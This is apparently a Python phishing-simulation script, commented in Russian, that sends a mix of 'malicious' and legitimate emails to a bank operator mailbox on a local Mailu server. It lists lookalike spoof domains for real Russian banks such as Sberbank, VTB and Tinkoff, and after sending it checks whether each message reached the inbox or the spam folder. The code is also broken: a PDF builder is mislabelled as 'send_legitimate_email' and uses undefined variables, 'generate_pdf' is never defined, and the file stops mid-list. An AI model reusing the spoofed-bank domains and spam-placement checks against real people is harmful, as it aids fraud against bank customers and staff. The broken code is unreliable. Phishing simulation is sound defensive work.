#!/usr/bin/env python3
"""
Смешанная фишинговая атака: вредоносные + легитимные письма
"""

import smtplib
import time
import random
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.header import Header
import os
import io
import zipfile
import socket
import json
from pathlib import Path
import email
from email.header import decode_header
from email.utils import make_msgid
from file_generator import create_file_attachment

# Лог действий по сохранению в send_attachs (sent_attachments)
ATTACHMENTS_ACTION_LOG = os.getenv("ATTACHMENTS_ACTION_LOG", "send_attachs_actions.jsonl")
ATTACHMENTS_TEXT_LOG = os.getenv("ATTACHMENTS_TEXT_LOG", "send_attachs.log")

def append_send_attachs_log_line(output_dir: Path, line: str):
    """Пишет человекочитаемый лог в /app/sent_attachments."""
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
        log_path = output_dir / ATTACHMENTS_TEXT_LOG
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {line}\n")
    except Exception as e:
        print(f"   ⚠️  Не удалось записать текстовый log: {e}")

def log_send_attachs_action(output_dir: Path, action: str, meta: dict):
    """
    Пишет JSONL-лог в /app/sent_attachments о том, что было сохранено / не сохранено.
    action: SAVED | SKIPPED_SPAM | SEND_FAILED | ERROR
    """
    record = {
        "ts": datetime.now().isoformat(),
        "action": action,
        **(meta or {}),
    }
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
        log_path = output_dir / ATTACHMENTS_ACTION_LOG
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
        # Дублируем в человекочитаемый лог-файл
        msg_type = (meta or {}).get("type", "?")
        subject = (meta or {}).get("subject", "")
        saved_files = (meta or {}).get("saved_files", [])
        planned = (meta or {}).get("planned_attachments", [])
        append_send_attachs_log_line(
            output_dir,
            f"{action} type={msg_type} subject={subject!r} saved_files={len(saved_files)} planned_attachments={len(planned)}",
        )
        print(f"   🧾 send_attachs log: {action} -> {log_path.name} (+ {ATTACHMENTS_TEXT_LOG})")
    except Exception as e:
        print(f"   ⚠️  Не удалось записать send_attachs log: {e}")

# Функция для декодирования MIME заголовков
def decode_mime_words(s):
    """Декодирование заголовков письма"""
    if s is None:
        return ""
    decoded_fragments = decode_header(s)
    decoded_parts = []
    for fragment, encoding in decoded_fragments:
        if isinstance(fragment, bytes):
            decoded_parts.append(fragment.decode(encoding or 'utf-8', errors='ignore'))
        else:
            decoded_parts.append(fragment)
    return ''.join(decoded_parts)

# Функция проверки спама через заголовки
def check_email_is_spam(msg):
    """Проверка спама через заголовки письма"""
    try:
        spam_flag = msg.get('X-Spam-Flag', '').lower()
        spam_status = msg.get('X-Spam-Status', '').lower()
        spam_score = msg.get('X-Spam-Score', '')
        
        if spam_flag == 'yes' or 'yes' in spam_status:
            return True
        
        try:
            if spam_score:
                score_match = spam_score.split('/')[0].strip()
                score = float(score_match)
                if score > 5.0:
                    return True
        except:
            pass
        
        if 'spam' in spam_status and 'no' not in spam_status:
            return True
        
        return False
    except:
        return False

# Бренды и домены для реалистичных отправителей и их подделок
BRANDS = [
    # Основные банки России
    {
        "name": "SberBank",
        "legit_domain": "sberbank.ru",
        "spoof_domains": ["sber-bank.ru", "sberbank.co", "sberbankk.ru", "sberbank.com", "sberbank-promo.ru", "sberbank-verify.co", "sberbank-security.net", "sberbank-update.com", "sberbank-free.ru", "sberbank-winner.com", "sberbank-money.net", "sberbank-cash.co", "sberbank-bonus.ru", "sberbank-gift.com", "sberbank-prize.net", "sberbank-lottery.co", "sberbank-jackpot.ru", "sberbank-million.com", "sberbank-billion.net", "sberbank-wealth.co"]
    },
    {
        "name": "VTB",
        "legit_domain": "vtb.ru",
        "spoof_domains": ["vtb-bank.ru", "vtb.co", "vtbbank.ru", "vtb.com", "vtb-promo.ru", "vtb-verify.co", "vtb-security.net", "vtb-update.com", "vtb-free.ru", "vtb-winner.com", "vtb-money.net", "vtb-cash.co", "vtb-bonus.ru", "vtb-gift.com", "vtb-prize.net", "vtb-lottery.co", "vtb-jackpot.ru", "vtb-million.com", "vtb-billion.net", "vtb-wealth.co"]
    },
    {
        "name": "AlfaBank",
        "legit_domain": "alfabank.ru",
        "spoof_domains": ["alfa-bank.ru", "alfabank.co", "alfabankk.ru", "alfabank.com", "alfabank-promo.ru", "alfabank-verify.co", "alfabank-security.net", "alfabank-update.com", "alfabank-free.ru", "alfabank-winner.com", "alfabank-money.net", "alfabank-cash.co", "alfabank-bonus.ru", "alfabank-gift.com", "alfabank-prize.net", "alfabank-lottery.co", "alfabank-jackpot.ru", "alfabank-million.com", "alfabank-billion.net", "alfabank-wealth.co"]
    },
    {
        "name": "Gazprombank",
        "legit_domain": "gazprombank.ru",
        "spoof_domains": ["gazprom-bank.ru", "gazprombank.co", "gazprombankk.ru", "gazprombank.com"]
    },
    {
        "name": "Rosbank",
        "legit_domain": "rosbank.ru",
        "spoof_domains": ["ros-bank.ru", "rosbank.co", "rosbankk.ru", "rosbank.com"]
    },
    {
        "name": "Raiffeisenbank",
        "legit_domain": "raiffeisen.ru",
        "spoof_domains": ["raiffeisen-bank.ru", "raiffeisen.co", "raiffeisenn.ru", "raiffeisen.com"]
    },
    {
        "name": "Tinkoff",
        "legit_domain": "tinkoff.ru",
        "spoof_domains": ["tinkoff-bank.ru", "tinkoff.co", "tinkofff.ru", "tinkoff.com"]
    },
    {
        "name": "MKB",
        "legit_domain": "mkb.ru",
        "spoof_domains": ["mkb-bank.ru", "mkb.co", "mkbbank.ru", "mkb.com"]
    },
    
    # Региональные банки
    {
        "name": "BankMoscow",
        "legit_domain": "bm.ru",
        "spoof_domains": ["bank-moscow.ru", "bm-bank.ru", "bmm.ru", "bm.com"]
    },
    {
        "name": "BankStPetersburg",
        "legit_domain": "bspb.ru",
        "spoof_domains": ["bank-spb.ru", "bspb-bank.ru", "bspbb.ru", "bspb.com"]
    },
    {
        "name": "BankUralsib",
        "legit_domain": "uralsib.ru",
        "spoof_domains": ["uralsib-bank.ru", "uralsib.co", "uralsibb.ru", "uralsib.com"]
    },
    {
        "name": "BankZenit",
        "legit_domain": "zenit.ru",
        "spoof_domains": ["zenit-bank.ru", "zenit.co", "zenitt.ru", "zenit.com"]
    },
    
    # Корпоративные банки
    {
        "name": "BankRossiya",
        "legit_domain": "abr.ru",
        "spoof_domains": ["bank-rossiya.ru", "abr-bank.ru", "abrr.ru", "abr.com"]
    },
    {
        "name": "BankOtkritie",
        "legit_domain": "open.ru",
        "spoof_domains": ["bank-otkritie.ru", "open-bank.ru", "openn.ru", "open.com"]
    },
    {
        "name": "BankPromsvyazbank",
        "legit_domain": "psbank.ru",
        "spoof_domains": ["promsvyaz-bank.ru", "psbank.co", "psbankk.ru", "psbank.com"]
    },
    {
        "name": "BankSovcombank",
        "legit_domain": "sovcombank.ru",
        "spoof_domains": ["sovcom-bank.ru", "sovcombank.co", "sovcombankk.ru", "sovcombank.com"]
    },
    
    # Технологические банки
    {
        "name": "BankQiwi",
        "legit_domain": "qiwi.ru",
        "spoof_domains": ["qiwi-bank.ru", "qiwi.co", "qiwii.ru", "qiwi.com"]
    },
    {
        "name": "BankYandex",
        "legit_domain": "yabank.ru",
        "spoof_domains": ["yandex-bank.ru", "yabank.co", "yabankk.ru", "yabank.com"]
    },
    {
        "name": "BankMailRu",
        "legit_domain": "mail.ru",
        "spoof_domains": ["mail-bank.ru", "mail.ru-bank", "maill.ru", "mail.ru"]
    },
    
    # Оригинальные бренды для разнообразия
    {
        "name": "TechnoInvest",
        "legit_domain": "technoinvest.com",
        "spoof_domains": ["techno-invest.com", "technoinvesl.com", "teehnoinvest.com", "technoinvest.co"]
    },
    {
        "name": "FinGroup",
        "legit_domain": "fingroup.ru",
        "spoof_domains": ["fingroupp.ru", "fin-group.ru", "fingr0up.ru", "fingroup.co"]
    },
    {
        "name": "BizService",
        "legit_domain": "bizservice.io",
        "spoof_domains": ["biz-servlce.io", "b1zservice.io", "bizservice.co", "bizservices.io"]
    },
    {
        "name": "CorpoTech",
        "legit_domain": "corpotech.com",
        "spoof_domains": ["corpotec.com", "corp0tech.com", "corpo-tech.com", "corpotech.co"]
    },
    {
        "name": "InvestProject",
        "legit_domain": "investproject.net",
        "spoof_domains": ["investprojeet.net", "invest-project.net", "lnvestproject.net", "investproject.co"]
    }
]

LEGIT_LOCALPARTS = [
    # Банковские подразделения ДБО
    "dbo", "dbo-support", "dbo-admin", "dbo-operations", "dbo-security", "dbo-technical",
    "client-service", "client-support", "client-manager", "client-advisor", "client-specialist",
    "operations", "operations-manager", "operations-specialist", "operations-support",
    "security", "security-manager", "security-analyst", "security-monitoring",
    "compliance", "compliance-manager", "compliance-officer", "compliance-specialist",
    "risk-management", "risk-analyst", "risk-manager", "risk-officer",
    "it-support", "it-admin", "it-technical", "it-operations", "it-security",
    "customer-service", "customer-support", "customer-manager", "customer-advisor",
    "account-manager", "relationship-manager", "client-relations", "business-manager",
    "documentation", "documents", "paperwork", "registration", "onboarding",
    "technical-support", "helpdesk", "service-desk", "support-team",
    "urgent", "priority", "emergency", "critical", "immediate",
    "noreply", "no-reply", "automated", "system", "notification"
]

def check_email_spam_after_send(target_email, subject, message_id=None, wait_seconds=8):
    """
    Проверяет, попало ли отправленное письмо в спам через файловую систему Mailu
    Ищет письмо по Message-ID (если задан) и/или по теме.
    Если письмо найдено в папках .Spam/.Junk → считаем СПАМ.
    Если письмо найдено в INBOX → проверяем X-Spam заголовки.
    Возвращает (is_spam: bool, info: dict)
    """
    info = {
        "message_id": message_id,
        "found_in": None,  # 'spam_folder' | 'inbox' | None
        "found_path": None,
        "spam_headers": {},
        "reason": None,
    }
    try:
        # Настройки maildir
        mail_dir = os.getenv('MAIL_DIR', '/mailu/mail')
        mail_domain = os.getenv('MAIL_DOMAIN', 'financepro.ru')
        
        # Извлекаем локальную часть email (до @)
        local_part = target_email.split('@')[0] if '@' in target_email else target_email
        
        # Путь к maildir пользователя
        user_maildir = Path(mail_dir) / mail_domain / local_part
        
        # Проверяем существование директории
        if not user_maildir.exists():
            print(f"   ⚠️  Maildir не найден: {user_maildir}, считаем что письмо не в спаме")
            info["reason"] = "maildir_not_found"
            return (False, info)
        
        # Нормализуем Message-ID для сравнения
        msgid_norm = None
        if message_id:
            msgid_norm = message_id.strip()

        # Будем ждать/проверять некоторое время, т.к. письмо может сначала появиться в INBOX, а потом переехать в Spam
        total_wait = max(wait_seconds, 6)
        deadline = time.time() + total_wait

        subject_part = (subject or "")[:60].lower()

        def iter_recent_files(dir_path: Path, recent_seconds: int = 300):
            if not dir_path.exists():
                return []
            current_time = time.time()
            files = []
            try:
                for p in dir_path.iterdir():
                    if p.is_file():
                        try:
                            mtime = p.stat().st_mtime
                            if current_time - mtime < recent_seconds:
                                files.append((p, mtime))
                        except Exception:
                            continue
            except Exception:
                return []
            files.sort(key=lambda x: x[1], reverse=True)
            return files

        def message_matches(msg_obj):
            # 1) Message-ID приоритетнее темы
            if msgid_norm:
                got = (msg_obj.get("Message-ID", "") or "").strip()
                if got == msgid_norm:
                    return True
            # 2) fallback по теме
            msg_subject = decode_mime_words(msg_obj.get('Subject', '')).lower()
            if subject_part and subject_part in msg_subject:
                return True
            return False

        def check_headers_for_spam(msg_obj):
            spam_flag = msg_obj.get('X-Spam-Flag', '')
            spam_status = msg_obj.get('X-Spam-Status', '')
            spam_score = msg_obj.get('X-Spam-Score', '')
            spam_level = msg_obj.get('X-Spam-Level', '')
            spam_result = msg_obj.get('X-Spam', '')

            info["spam_headers"] = {
                "X-Spam-Flag": spam_flag,
                "X-Spam-Status": spam_status,
                "X-Spam-Score": spam_score,
                "X-Spam-Level": spam_level,
                "X-Spam": spam_result,
            }

            is_spam = False
            if spam_flag and spam_flag.strip().lower() == 'yes':
                is_spam = True
            if spam_status and 'yes' in spam_status.lower():
                is_spam = True
            if spam_result and spam_result.strip().lower() == 'yes':
                is_spam = True
            if spam_score:
                try:
                    score_match = spam_score.split('/')[0].strip()
                    score = float(score_match)
                    if score > 5.0:
                        is_spam = True
                except Exception:
                    pass
            return is_spam

        # Подготовим директории: сначала СПАМ-папки, потом INBOX
        inbox_dirs = [user_maildir / 'new', user_maildir / 'cur']

        spam_dirs = []
        try:
            for sub in user_maildir.iterdir():
                if sub.is_dir() and sub.name.startswith('.'):
                    low = sub.name.lower()
                    if 'spam' in low or 'junk' in low:
                        spam_dirs.extend([sub / 'new', sub / 'cur'])
        except Exception:
            pass

        print(f"   ⏳ Проверка maildir (ищу по Message-ID/теме) в: {user_maildir}")
        if msgid_norm:
            print(f"      Message-ID: {msgid_norm}")

        # Polling до deadline
        while True:
            # 1) Проверяем спам-папки (если письмо там — сразу СПАМ)
            for d in spam_dirs:
                for email_file, _ in iter_recent_files(d):
                    try:
                        with open(email_file, 'rb') as f:
                            msg = email.message_from_bytes(f.read())
                        if message_matches(msg):
                            info["found_in"] = "spam_folder"
                            info["found_path"] = str(email_file)
                            info["reason"] = "found_in_spam_folder"
                            print(f"   🚫 Найдено в СПАМ-папке: {email_file}")
                            return (True, info)
                    except Exception:
                        continue

            # 2) Проверяем INBOX — если письмо там, смотрим заголовки
            for d in inbox_dirs:
                for email_file, _ in iter_recent_files(d):
                    try:
                        with open(email_file, 'rb') as f:
                            msg = email.message_from_bytes(f.read())
                        if message_matches(msg):
                            info["found_in"] = "inbox"
                            info["found_path"] = str(email_file)
                            is_spam = check_headers_for_spam(msg)
                            if is_spam:
                                info["reason"] = "spam_headers_in_inbox"
                                print(f"   🚫 Найдено в INBOX, заголовки говорят СПАМ: {email_file}")
                                return (True, info)
                            info["reason"] = "found_in_inbox_not_spam"
                            print(f"   ✅ Найдено в INBOX, не спам по заголовкам: {email_file}")
                            return (False, info)
                    except Exception:
                        continue

            if time.time() >= deadline:
                break
            time.sleep(1)

        print(f"   ⚠️  Письмо не найдено в maildir (INBOX/Spam) за {total_wait} сек")
        print(f"   🚫 По умолчанию: НЕ сохраняем (fail-closed), чтобы спам не ушел в автоматизацию")
        info["reason"] = "not_found_fail_closed"
        return (True, info)
        
    except Exception as e:
        print(f"   ⚠️  Ошибка проверки спама через maildir: {e}")
        import traceback
        traceback.print_exc()
        info["reason"] = f"exception: {e}"
        # fail-closed: если проверка сломалась, лучше не сохранять
        return (True, info)


def wait_for_smtp_server(smtp_server, smtp_port, max_attempts=30, delay=2):
    """Ожидание готовности SMTP сервера"""
    print(f"⏳ Ожидание готовности SMTP сервера {smtp_server}:{smtp_port}...")
    
    for attempt in range(max_attempts):
        try:
            # Проверяем доступность порта
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((smtp_server, smtp_port))
            sock.close()
            
            if result == 0:
                print(f"✅ SMTP сервер {smtp_server}:{smtp_port} готов!")
                return True
            else:
                print(f"   Попытка {attempt + 1}/{max_attempts}: сервер не готов, ждем {delay} сек...")
                time.sleep(delay)
                
        except Exception as e:
            print(f"   Попытка {attempt + 1}/{max_attempts}: ошибка подключения - {e}")
            time.sleep(delay)
    
    print(f"❌ SMTP сервер {smtp_server}:{smtp_port} не готов после {max_attempts} попыток")
    return False

def send_email_with_retry(msg, smtp_server, smtp_port, max_attempts=5):
    """Отправка письма с повторными попытками"""
    
    for attempt in range(max_attempts):
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.send_message(msg)
            server.quit()
            return True
            
        except smtplib.SMTPRecipientsRefused as e:
            print(f"   ❌ Получатель отклонен: {e}")
            return False
            
        except smtplib.SMTPDataError as e:
            if e.smtp_code == 451:
                print(f"   ⏳ Попытка {attempt + 1}/{max_attempts}: Сервер временно недоступен (451), ждем 10 сек...")
                time.sleep(10)
                continue
            else:
                print(f"   ❌ Ошибка данных SMTP: {e}")
                return False
                
        except Exception as e:
            print(f"   ⏳ Попытка {attempt + 1}/{max_attempts}: Ошибка отправки - {e}, ждем 5 сек...")
            time.sleep(5)
    
    print(f"   ❌ Не удалось отправить письмо после {max_attempts} попыток")
    return False

def send_legitimate_email():
    # Более «интересный» PDF: заголовок, разделители, таблица реквизитов, второй лист с примечаниями
    def esc(txt: str) -> bytes:
        return txt.replace("(", "[").replace(")", "]").encode("utf-8")

    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    objects: list[bytes] = []

    # 1: Catalog (с двумя страницами)
    # 2: Pages
    # 3: Page1, 4: Page1 content
    # 5: Page2, 6: Page2 content
    # 7: Font Helvetica, 8: Font Helvetica-Bold

    # Font objects
    font_helv = b"7 0 obj\n<</Type /Font /Subtype /Type1 /BaseFont /Helvetica>>\nendobj\n"
    font_helv_b = b"8 0 obj\n<</Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold>>\nendobj\n"
    objects.append(font_helv)
    objects.append(font_helv_b)

    # Page 1 content stream
    title = f"Документы {company}"
    subtitle = "Подтверждение реквизитов и тарифов"
    # Рисуем заголовок жирным, линию-разделитель, затем «таблицу» текстом по строкам
    table_rows = [
        ("Наименование", company),
        ("ИНН", "XXXXXXXXXX"),
        ("Контакт", "+7 (495) 000-00-00"),
        ("Адрес", "г. Москва, Примерная ул., д. 1"),
        ("Тариф", "Расчетный счет — Бизнес PRO"),
    ]

    page1_stream_cmds = []
    page1_stream_cmds.append(b"BT /F1b 20 Tf 72 780 Td (" + esc(title) + b") Tj ET\n")
    page1_stream_cmds.append(b"0.6 w 72 770 m 540 770 l S\n")  # горизонтальная линия
    page1_stream_cmds.append(b"BT /F1 12 Tf 72 750 Td (" + esc(subtitle) + b") Tj ET\n")

    y = 720
    for name, value in table_rows:
        page1_stream_cmds.append((f"BT /F1b 12 Tf 72 {y} Td (".encode() + esc(name + ": ") + b") Tj ET\n"))
        page1_stream_cmds.append((f"BT /F1 12 Tf 200 {y} Td (".encode() + esc(value) + b") Tj ET\n"))
        y -= 18

    # Примитивная «рамка» вокруг области
    page1_stream_cmds.append(b"0.6 w 68 700 m 548 700 l 548 600 l 68 600 l 68 700 l S\n")
    # Несколько заполнителей текста внутри рамки
    text_lines = [
        "Просим подтвердить корректность реквизитов и тарифов.",
        "В случае изменений прошу направить актуальные документы.",
        "Готовы предоставить дополнительные сведения по запросу.",
    ]
    y = 680
    for line in text_lines:
        page1_stream_cmds.append((f"BT /F1 11 Tf 76 {y} Td (".encode() + esc(line) + b") Tj ET\n"))
        y -= 16

    page1_stream = b"q\n" + b"".join(page1_stream_cmds) + b"Q\n"
    page1_obj = b"4 0 obj\n<</Length " + str(len(page1_stream)).encode() + b">>\nstream\n" + page1_stream + b"endstream\nendobj\n"
    objects.append(page1_obj)

    # Page 2 content stream — примечания и список пунктов
    notes = [
        "Примечание 1: Документы действительны в течение 30 дней.",
        "Примечание 2: Тарифы могут отличаться в зависимости от оборотов.",
        "Примечание 3: Возможна интеграция с ДБО и ЭДО.",
        "Примечание 4: Для валютных операций требуется доп. согласование.",
    ]
    page2_stream_cmds = [b"BT /F1b 16 Tf 72 780 Td (Notes) Tj ET\n"]
    y = 750
    bullet = "\u2022 "
    for n in notes:
        page2_stream_cmds.append((f"BT /F1 12 Tf 84 {y} Td (".encode() + esc(bullet + n) + b") Tj ET\n"))
        y -= 18
    page2_stream = b"q\n" + b"".join(page2_stream_cmds) + b"Q\n"
    page2_obj = b"6 0 obj\n<</Length " + str(len(page2_stream)).encode() + b">>\nstream\n" + page2_stream + b"endstream\nendobj\n"
    objects.append(page2_obj)

    # Page objects and Pages tree
    page1 = b"3 0 obj\n<</Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R /Resources <</Font <</F1 7 0 R /F1b 8 0 R>> >> >>\nendobj\n"
    page2 = b"5 0 obj\n<</Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 6 0 R /Resources <</Font <</F1 7 0 R /F1b 8 0 R>> >> >>\nendobj\n"
    objects.append(page1)
    objects.append(page2)

    pages = b"2 0 obj\n<</Type /Pages /Kids [3 0 R 5 0 R] /Count 2>>\nendobj\n"
    catalog = b"1 0 obj\n<</Type /Catalog /Pages 2 0 R>>\nendobj\n"
    # Reorder: catalog, pages, page1, page1content, page2, page2content, fonts
    ordered = [catalog, pages, page1, page1_obj, page2, page2_obj, font_helv, font_helv_b]

    # Build xref
    offsets = []
    pos = len(header)
    for obj in ordered:
        offsets.append(pos)
        pos += len(obj)
    xref = b"xref\n0 9\n0000000000 65535 f \n" + b"".join([f"{o:010d} 00000 n \n".encode() for o in offsets])
    trailer = b"trailer\n<</Size 9 /Root 1 0 R>>\nstartxref\n" + str(len(header) + sum(len(o) for o in ordered)).encode() + b"\n%%EOF\n"

    pdf_bytes = header + b"".join(ordered) + xref + trailer
    target_len = size_kb * 1024
    if len(pdf_bytes) < target_len:
        pdf_bytes += b"\n%pad" + b"0" * (target_len - len(pdf_bytes))
    return pdf_bytes

def generate_ooxml(kind: str, size_kb: int, company: str) -> bytes:
    # kind: 'docx' | 'xlsx' | 'pptx'
    mem = io.BytesIO()
    with zipfile.ZipFile(mem, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        # Common
        zf.writestr("[Content_Types].xml", (
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"
            + ("<Default Extension=\"xml\" ContentType=\"application/xml\"/>")
            + ("<Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>")
            + ("<Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>" if kind=="docx" else "")
            + ("<Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/>" if kind=="xlsx" else "")
            + ("<Override PartName=\"/ppt/presentation.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml\"/>" if kind=="pptx" else "")
            + "</Types>"
        ))
        zf.writestr("_rels/.rels", (
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
            + ("<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>" if kind=="docx" else "")
            + ("<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>" if kind=="xlsx" else "")
            + ("<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"ppt/presentation.xml\"/>" if kind=="pptx" else "")
            + "</Relationships>"
        ))
        if kind == "docx":
            zf.writestr("word/document.xml", (
                "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
                "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">"
                f"<w:body><w:p><w:r><w:t>Document for {company}</w:t></w:r></w:p></w:body></w:document>"
            ))
        elif kind == "xlsx":
            zf.writestr("xl/workbook.xml", (
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets></workbook>"
            ))
            zf.writestr("xl/_rels/workbook.xml.rels", (
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
                "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>"
                "</Relationships>"
            ))
            zf.writestr("xl/worksheets/sheet1.xml", (
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><v>1</v></c><c r=\"B1\"><v>2</v></c></row></sheetData></worksheet>"
            ))
        elif kind == "pptx":
            zf.writestr("ppt/presentation.xml", (
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<p:presentation xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">"
                "<p:sldIdLst><p:sldId id=\"256\" r:id=\"rId1\"/></p:sldIdLst></p:presentation>"
            ))
            zf.writestr("ppt/_rels/presentation.xml.rels", (
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
                "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide\" Target=\"slides/slide1.xml\"/>"
                "</Relationships>"
            ))
            zf.writestr("ppt/slides/slide1.xml", (
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                "<p:sld xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\"><p:cSld><p:spTree><p:sp><p:nvSpPr/><p:spPr/><p:txBody><a:p xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\"><a:r><a:t>Slide for "
                f"{company}"
                "</a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>"
            ))
    data = mem.getvalue()
    if len(data) < size_kb * 1024:
        data += b"0" * (size_kb * 1024 - len(data))
    return data

def generate_placeholder_content(mime_type: str, size_kb: int, company: str) -> bytes:
    if mime_type == "application/pdf":
        return generate_pdf(company, size_kb)
    if mime_type.endswith("wordprocessingml.document"):
        return generate_ooxml("docx", size_kb, company)
    if mime_type.endswith("spreadsheetml.sheet"):
        return generate_ooxml("xlsx", size_kb, company)
    if mime_type.endswith("presentationml.presentation"):
        return generate_ooxml("pptx", size_kb, company)
    # fallback
    return (b"DATA for " + company.encode("utf-8")) * max(128, size_kb)

def send_legitimate_email():
    """Отправка легитимного письма"""
    
    # SMTP настройки
    smtp_server = os.getenv('SMTP_SERVER', 'front')
    smtp_port = int(os.getenv('SMTP_PORT', '587'))

    # Выбор легитимного внешнего домена и локальной части
    brand = random.choice(BRANDS)
    legit_domain = brand["legit_domain"]
    localpart = random.choice(LEGIT_LOCALPARTS)
    sender_email = f"{localpart}@{legit_domain}"
    target_email = os.getenv('TARGET_EMAIL', 'operator1@financepro.ru')
    
    # Легитимные темы и содержимое
    legitimate_subjects = [
        # Создание и управление УЗ в ДБО
        "Создание учетной записи в системе ДБО",
        "Регистрация нового пользователя ДБО",
        "Активация учетной записи клиента",
        "Настройка прав доступа в ДБО",
        "Создание дополнительной УЗ для клиента",
        "Регистрация доверенного лица",
        "Создание УЗ для филиала",
        "Активация корпоративного доступа",
        "Настройка ролей пользователей",
        "Создание УЗ для бухгалтерии",
        
        # Рабочие вопросы ДБО
        "Запрос на увеличение лимитов",
        "Изменение параметров ДБО",
        "Настройка шаблонов платежей",
        "Обновление реквизитов в ДБО",
        "Изменение карточки подписей",
        "Настройка уведомлений",
        "Изменение лимитов по операциям",
        "Настройка маршрутизации платежей",
        "Обновление контактных данных",
        "Изменение настроек безопасности",
        
        # Документооборот
        "Документы для регистрации в ДБО",
        "Справки для подключения ДБО",
        "Учредительные документы",
        "Доверенности на управление ДБО",
        "Карточки образцов подписей",
        "Справки о бенефициарах",
        "Документы для изменения лимитов",
        "Справки для открытия дополнительных УЗ",
        "Документы для изменения реквизитов",
        "Справки для настройки уведомлений",
        
        # Техническая поддержка ДБО
        "Проблемы с доступом к ДБО",
        "Ошибки при входе в систему",
        "Сброс пароля пользователя",
        "Блокировка учетной записи",
        "Восстановление доступа к ДБО",
        "Проблемы с подписанием документов",
        "Ошибки при формировании платежей",
        "Проблемы с отправкой документов",
        "Технические вопросы по ДБО",
        "Консультация по функционалу",
        
        # Безопасность и контроль
        "Подозрительная активность в ДБО",
        "Несанкционированные операции",
        "Проверка безопасности доступа",
        "Аудит действий пользователей",
        "Контроль лимитов операций",
        "Мониторинг подозрительных платежей",
        "Проверка соответствия процедурам",
        "Контроль соблюдения регламентов",
        "Анализ рисков операций",
        "Отчет по безопасности ДБО"
    ]
    
    legitimate_companies = [
        # Технологические компании
        "ООО ТехноИнновации",
        "АО ФинансГрупп", 
        "ООО БизнесСервис",
        "АО КорпоТех",
        "ООО ИнвестПроект",
        "ООО Цифровые Решения",
        "АО Инновационные Технологии",
        "ООО Системы Безопасности",
        "АО Программные Комплексы",
        "ООО Информационные Сервисы",
        
        # Финансовые компании
        "ООО Финансовый Консалтинг",
        "АО Инвестиционная Группа",
        "ООО Банковские Услуги",
        "АО Страховая Компания",
        "ООО Лизинговые Решения",
        "АО Финансовый Анализ",
        "ООО Кредитные Услуги",
        "АО Управление Активами",
        
        # Производственные компании
        "ООО Промышленные Технологии",
        "АО Машиностроительный Завод",
        "ООО Химические Продукты",
        "АО Металлургический Комплекс",
        "ООО Энергетические Решения",
        "АО Строительные Материалы",
        "ООО Автомобильные Компоненты",
        "АО Электронные Приборы",
        
        # Торговые компании
        "ООО Торговый Дом",
        "АО Оптовая Торговля",
        "ООО Розничные Сети",
        "АО Импорт-Экспорт",
        "ООО Логистические Услуги",
        "АО Дистрибьюторские Решения",
        "ООО Маркетинговые Агентства",
        "АО Рекламные Технологии",
        
        # Консалтинговые компании
        "ООО Управленческий Консалтинг",
        "АО Юридические Услуги",
        "ООО Аудиторские Решения",
        "АО Налоговое Планирование",
        "ООО HR Консалтинг",
        "АО Стратегическое Планирование",
        "ООО Бизнес Аналитика",
        "АО Корпоративное Развитие",
        
        # Оригинальные компании
        "ООО Ромашка",
